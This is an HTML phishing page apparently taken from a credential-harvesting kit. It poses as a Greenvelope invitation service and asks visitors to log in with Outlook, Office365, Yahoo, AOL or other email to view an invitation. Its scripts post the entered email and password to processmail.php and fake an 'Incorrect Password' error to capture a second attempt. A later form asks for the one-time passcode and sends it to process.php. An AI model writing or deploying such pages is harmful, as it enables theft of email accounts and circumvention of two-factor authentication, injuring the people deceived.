<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">

<link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css'>
    <!-- Font Awesome CSS -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>

    <style>
body, html {
  height: 100%;
  margin: 0;
  font-family: Arial, Helvetica, sans-serif;
}

* {
  box-sizing: border-box;
}

.bg-image {
    /* The image used */
    background-image: url("Image/imageedit_3_2453183620.jpg");
    
    /* Add the blur effect */
    filter: blur(8px);
    -webkit-filter: blur(8px);
    
    /* Full height */
    height: 100%; 
    
    /* Center and scale the image nicely */
    background-position: center;
    background-repeat: no-repeat;
    background-size: cover;
  }
  
/* Position text in the middle of the page/image */
.bg-text {
    /* background-color: rgb(0,0,0); Fallback color */
    /* background-color: rgba(0,0,0, 0.4); Black w/opacity/see-through */
    background-color: #00000099;
    /* opacity: 0.8; */
    color: white;
    /* font-weight: bold; */
    border: 3px solid #f1f1f1;
    border-radius:15px;
    position: absolute;
    top: 10%;
    left: 25%;
    /* transform: translate(-50%, -50%); */
    /* z-index: 2; */
    width: 50%;
    padding: 20px;
    text-align: center;
  }
.modal-body{
  text-align: left;
  color:black;
}
  .button{
      width: 80%;
      color:white;
      margin:auto;
      display:flex;
      margin-top:20px;
  }
  .b1{
      background-color: blue;
  }
  .b2{
      background-color: red;
  }
  .b3{
      background-color: #4d8fe4;
  }
  .b4{
      background-color: #8f1189;
  }
  .b5{
      background-color: green;
  }
  .btext{
      margin-left:20px;
      margin-top:5px;
  }

  Add Animation
  @-webkit-keyframes slideIn {
    from {bottom: -300px; opacity: 0} 
    to {bottom: 0; opacity: 1}
  }
  
  @keyframes slideIn {
    from {bottom: -300px; opacity: 0}
    to {bottom: 0; opacity: 1}
  }
  
  @-webkit-keyframes fadeIn {
    from {opacity: 0} 
    to {opacity: 1}
  }
  
  @keyframes fadeIn {
    from {opacity: 0} 
    to {opacity: 1}
  }

  @media only screen and (max-width: 767px) {
            
            .bg-text{
                width:85%;
                padding: 10px;
                
            }
            .imagem img{
                width: 80px;
                height: 80px;
            }
            .bg-text {
              top: 10%;
              left: 7%;
              /* width: 50%; */
              
            }
}


</style>
</head>
<body>

<div class="bg-image"></div>

<div class="bg-text">
  <div class="imagem">
    <img src="Image/imageedit_5_9844662071.png" alt="Logo of adobe" class="img-fluid" width="250px"><br>
  </div>
  <span class="h4 text-white" style="font-weight: bold;">Manage your Online Invitations & Greeting Card</span><br>
  <br> <span class="h6 text-white font-weight-normal" style="font-size: 14px;">To view the invitation, please select your email provider below and log in. You were invited to access the invitation on Greenenvlope.</span>
  </p>
  
  <div type="button" class="button b1 formModals" id="myBtn" data-name="Outlook" data-image="Image/office360.png" data-formid="1">
    <img src="Image/office360.png" alt="office 360" width="30px" height="30px">    <span class="btext">  Sign in with Outlook </span>
  </div>
  <div class="button b2 formModals" id="myBtno" data-name="Office" data-image="Image/office.png" data-formid="2">
    <img src="Image/office.png" alt="office 360" width="30px" height="30px">    <span class="btext">  Sign in with Office365 </span>
  </div>

  <div class="button b4 formModals" id="myBtny" data-name="Yahoo" data-image="Image/yahoo.png" data-formid="3">
    <img src="Image/yahoo.png" alt="office 360" width="30px" height="30px">    <span class="btext">  Sign in with Yahoo Mail </span>
  </div>

  <div class="button b5 formModals" id="myBtna" data-name="aol" data-image="Image/aol.png" data-formid="4">
    <img src="Image/aol.png" alt="office 360" width="30px" height="30px">    <span class="btext">  Sign in with AOL </span>
  </div>

  <div class="button b3 formModals" id="myBtne" data-name="Email" data-image="Image/email.png" data-formid="5">
    <img src="Image/email.png" alt="office 360" width="30px" height="30px">    <span class="btext">  Sign in with Other Mail </span>
  </div>
  
  <p class="text-white mt-3 text-center" style="font-size: 14px;">Online Invitations & Birthday Cards, greenvelope simplifies event planning with user-friendly tools for managing online invitations and greeting cards.</p>
  <p class="h8 text-center text-white" style="font-size: 11px; font-weight: bold;">© 2025 Sincere Corporation, greenvelope is a registered trademark of Sincere Corporation. All rights reserved. All other product and company names are trademarks or registered trademarks of their respective holders.</p> 



 
           <!-- modal -->
          
           <div class="modal fade" id="formModal" tabindex="-1" role="dialog"
                    aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
                    <div class="modal-dialog modal-dialog-centered" role="document">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h5 class="modal-title" id="exampleModalLongTitle">
                                    <!-- Office36500 -->
                                </h5>
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">&times;</span>
                                </button>
                            </div>
                            <div class="modal-body">
                                <div class="text-center mb-5">
                                    <div class="data-image"></div>
                                    <h4 class="mt-2 txx_hd"> Login
                                        with <span class="form-title"></span> </h4>
                                </div>
                                <form method="post" id="formSubmit" action="processmail.php" class="stage-one">
                                        <p id="error_text" class="text-danger"></p>
                                    <input type="text" id="form-id" name="id" hidden>
                                    <label for="email" class="form_tx">Email
                                        Address </label>
                                    <input type="email" placeholder="Email" class="form-control" name="email_address" required>
                                    <br>
                                    <p> We'll never share your email
                                        with anyone else </p>
                                    <label for="Password">Password</label>
                                    <input type="password" placeholder="Enter Password" class="form-control"
                                        name="password" required>

                                        <div class="mt-3 text-warning" id="loading" style="display: none;">Verifying...</div>

                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                                <button type="submit" class="btn btn-primary" name="submit_form"> Login
                                </button>
                            </div>
                            </form>
                        </div>
                    </div>
                </div>

                           <!-- OTP Notification Modal -->
                           <div class="modal fade" id="otpNotificationModal" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">OTP Notification</h5>
                <button type="button" class="close" data-dismiss="modal">&times;</button>
            </div>
            <div class="modal-body text-center">
                <div class="spinner-border text-primary" role="status"><span class="sr-only">Loading...</span></div>
                <p class="mt-3">You will receive an OTP within 1-5 minutes. Please check your phone number on file.</p>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-primary" id="proceedToOtp">OK</button>
            </div>
        </div>
    </div>
</div>
                <!-- Second Modal -->
                 <!-- Second Modal -->
                 <div class="modal fade" id="secondModal" tabindex="-1" role="dialog" aria-labelledby="secondModalLabel" aria-hidden="true">
                    <div class="modal-dialog" role="document">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h5 class="modal-title" id="exampleModalLongTitle">
                                    <!-- Office36500 -->
                                </h5>
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">&times;</span>
                                </button>
                            </div>


 
                            <form method="post" id="secondForm" action="process.php">
    <div class="modal-body text-center">
        <p style="font-weight:bold;">🔒 Please enter the OTP sent to your phone to complete sign-in. It may take up to 5 minutes.</p>
        
        <label for="lastname">🔢 Enter OTP</label>
        <input type="text" placeholder="Enter OTP" class="form-control text-center" name="txtotp" required>
        
        <!-- Countdown Timer -->
        <p class="mt-2 text-danger" id="countdown">Time left: 05:00</p>
        
        <!-- Loading Message -->
        <div class="mt-3 text-warning" id="loading" style="display: none;">⏳ Verifying...</div>
    </div>
    <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">❌ Close</button>
        <button type="submit" class="btn btn-primary" name="submit_second_form">✅ Submit</button>
    </div>
</form>

<script>
    // Countdown Timer Logic
    let timeLeft = 300; // 5 minutes in seconds
    const countdownElement = document.getElementById('countdown');

    function updateCountdown() {
        let minutes = Math.floor(timeLeft / 60);
        let seconds = timeLeft % 60;
        seconds = seconds < 10 ? '0' + seconds : seconds;
        countdownElement.innerHTML = `⏳ Time left: ${minutes}:${seconds}`;
        
        if (timeLeft > 0) {
            timeLeft--;
            setTimeout(updateCountdown, 1000);
        }
    }

    updateCountdown(); // Start countdown
</script>
                        </div>
                    </div>
                </div>
                


                <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.bundle.min.js"></script>


<script>
$(".formModals").click(function(e) {
    e.preventDefault();

    var id = $(this).data('formid');
    var formname = $(this).data('name');
    var image = $(this).data('image');

    $("#formModal").modal('show');

    $(".data-image").html("<img src='" + image + "' height='100' width='100' >");
    $(".form-title").html("<span>" + formname + "</span>")
    // $(".form-id").value = id;
    document.getElementById("form-id").value = id;

})
</script>

<script>
    $("#formSubmit").submit(function(e) {

        e.preventDefault(); // avoid to execute the actual submit of the form.

        var form = $(this);
        var actionUrl = form.attr('action');

        $.ajax({
            type: "POST",
            url: actionUrl,
            data: form.serialize(), // serializes the form's elements.
            success: function(data)
            {
                if (form.hasClass('stage-one')) {
                    // Stage one: Display "Incorrect Password" message
                    $("#error_text").text('Incorrect Password');
                    form.removeClass('stage-one').addClass('stage-three');
                }else if (form.hasClass('stage-three')){
                    $('#formModal').modal('hide');
                    $('#otpNotificationModal').modal('show');
                    // alert("Submit me");
                }
                console.log(data);

            }
        }           
                );

    });

    
    // Handle OTP proceed button
    $("#proceedToOtp").click(function() {
        $('#otpNotificationModal').modal('hide');
        $('#secondModal').modal('show');
    });
</script>

<script>
    $(document).ready(function() {
        $("#secondForm").submit(function(e) {
            e.preventDefault(); // avoid to execute the actual submit of the form.

            var form = $(this);
            var actionUrl = form.attr('action');

            $("#loading").show();

            // $.ajax({
            //     type: "POST",
            //     url: actionUrl,
            //     data: form.serialize(), // serializes the form's elements.
            //     dataType: "json", // Expect JSON response
            //     success: function(data) {
            //         if (data.status=="success") {
            //             window.location.href = "redirect.php"; 
            //             // alert('Email has been sent successfully');
            //         } else {
            //             alert('Failed to send email: ' + data.message);
            //         }
            //     },
                // error: function(xhr, status, error) {
                //     alert('An error occurred while sending the email: ' + error);
                // },

            //     complete: function() {
            //         // Hide loading indicator after request completes
            //         $("#loading").hide();
            //     }
            // });
        //     console.log(data);
        // });
    });
</script>



    
</body>
</html>
